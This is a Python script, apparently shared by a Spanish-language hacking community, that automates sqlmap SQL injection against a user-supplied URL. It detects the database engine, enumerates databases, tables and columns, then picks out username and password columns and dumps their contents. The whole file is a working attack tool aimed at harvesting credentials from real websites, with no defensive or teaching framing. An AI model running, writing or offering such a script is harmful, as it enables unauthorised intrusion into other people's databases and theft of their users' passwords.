import subprocess
import sys

# Colores para consola
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

banner = f"""

{Colors.OKGREEN}Happy Hunter ;-)

 ___   _                     _   _            _    _               _____                    
|_ _| | |    _____   _____  | | | | __ _  ___| | _(_)_ __   __ _  |_   _|__  __ _ _ __ ___  
 | |  | |   / _ \ \ / / _ \ | |_| |/ _` |/ __| |/ / | '_ \ / _` |   | |/ _ \/ _` | '_ ` _ \ 
 | |  | |__| (_) \ V /  __/ |  _  | (_| | (__|   <| | | | | (_| |   | |  __/ (_| | | | | | |
|___| |_____\___/ \_/ \___| |_| |_|\__,_|\___|_|\_\_|_| |_|\__, |   |_|\___|\__,_|_| |_| |_|
                                                           |___/                            

Bienvenidos a {Colors.BOLD}Hacking Team Comunidad De Hackers By AnonSec777{Colors.ENDC} Telegram: https://t.me/+74d-97oV7P05OTVk{Colors.ENDC}
"""

print(banner)

def run_sqlmap(args):
    """Ejecuta sqlmap con los argumentos dados y retorna la salida."""
    try:
        result = subprocess.run(
            ["sqlmap"] + args,
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error ejecutando sqlmap: {e.stderr}")
        sys.exit(1)

def detect_dbms(url, param):
    print("[*] Detectando DBMS...")
    args = [
        "-u", url,
        "-p", param,
        "--batch",
        "--level=3",
        "--risk=2",
          # para obtener info de DBMS si es posible
    ]
    output = run_sqlmap(args)
    # Buscar DBMS en la salida
    for line in output.splitlines():
        if "back-end DBMS" in line:
            dbms = line.split(":")[-1].strip()
            print(f"[+] DBMS detectado: {dbms}")
            return dbms
    print("[-] No se pudo detectar DBMS automáticamente, se usará PostgreSQL por defecto.")
    return "PostgreSQL"

def enumerate_dbs(url, param, dbms):
    print("[*] Enumerando bases de datos...")
    args = [
        "-u", url,
        "-p", param,
        "--batch",
        "--level=5",
        "--risk=3",
        "--dbms", dbms,
        "--dbs"
    ]
    output = run_sqlmap(args)
    dbs = []
    for line in output.splitlines():
        if line.startswith("[") or line.strip() == "":
            continue
        if line.strip().startswith("Database:"):
            db_name = line.split(":",1)[1].strip()
            dbs.append(db_name)
    if dbs:
        print(f"[+] Bases de datos encontradas: {', '.join(dbs)}")
    else:
        print("[-] No se encontraron bases de datos.")
    return dbs

def enumerate_tables(url, param, dbms, db_name):
    print(f"[*] Enumerando tablas en la base de datos '{db_name}'...")
    args = [
        "-u", url,
        "-p", param,
        "--batch",
        "--level=5",
        "--risk=3",
        "--dbms", dbms,
        "-D", db_name,
        "--tables"
    ]
    output = run_sqlmap(args)
    tables = []
    for line in output.splitlines():
        if line.startswith("[") or line.strip() == "":
            continue
        if line.strip().startswith("Table:"):
            table_name = line.split(":",1)[1].strip()
            tables.append(table_name)
    if tables:
        print(f"[+] Tablas encontradas en '{db_name}': {', '.join(tables)}")
    else:
        print(f"[-] No se encontraron tablas en '{db_name}'.")
    return tables

def enumerate_columns(url, param, dbms, db_name, table_name):
    print(f"[*] Enumerando columnas en la tabla '{table_name}' de la base de datos '{db_name}'...")
    args = [
        "-u", url,
        "-p", param,
        "--batch",
        "--level=5",
        "--risk=3",
        "--dbms", dbms,
        "-D", db_name,
        "-T", table_name,
        "--columns"
    ]
    output = run_sqlmap(args)
    columns = []
    for line in output.splitlines():
        if line.startswith("[") or line.strip() == "":
            continue
        if line.strip().startswith("Column:"):
            col_name = line.split(":",1)[1].strip()
            columns.append(col_name)
    if columns:
        print(f"[+] Columnas encontradas en '{table_name}': {', '.join(columns)}")
    else:
        print(f"[-] No se encontraron columnas en '{table_name}'.")
    return columns

def dump_data(url, param, dbms, db_name, table_name, columns):
    print(f"[*] Extrayendo datos de {db_name}.{table_name} ({', '.join(columns)}) ...")
    args = [
        "-u", url,
        "-p", param,
        "--batch",
        "--level=5",
        "--risk=3",
        "--dbms", dbms,
        "-D", db_name,
        "-T", table_name,
        "-C", ",".join(columns),
        "--dump"
    ]
    output = run_sqlmap(args)
    print(output)

def main():
    print("=== Script automatizado de sqlmap para extracción avanzada ===")
    url = input("Introduce la URL vulnerable (con parámetro): ").strip()
    if "?" not in url or "=" not in url:
        print("La URL debe contener al menos un parámetro GET, por ejemplo: http://site.com/page?id=1")
        sys.exit(1)
    param = url.split("?")[1].split("=")[0]

    dbms = detect_dbms(url, param)
    dbs = enumerate_dbs(url, param, dbms)
    if not dbs:
        print("No se pudo continuar sin bases de datos detectadas.")
        sys.exit(1)

    for db_name in dbs:
        tables = enumerate_tables(url, param, dbms, db_name)
        if not tables:
            continue
        for table in tables:
            columns = enumerate_columns(url, param, dbms, db_name, table)
            # Buscamos columnas típicas de usuario y contraseña
            user_cols = [c for c in columns if "user" in c.lower() or "admin" in c.lower()]
            pass_cols = [c for c in columns if "pass" in c.lower() or "pwd" in c.lower() or "contrasena" in c.lower()]
            if user_cols and pass_cols:
                dump_data(url, param, dbms, db_name, table, user_cols + pass_cols)

if __name__ == "__main__":
    main()
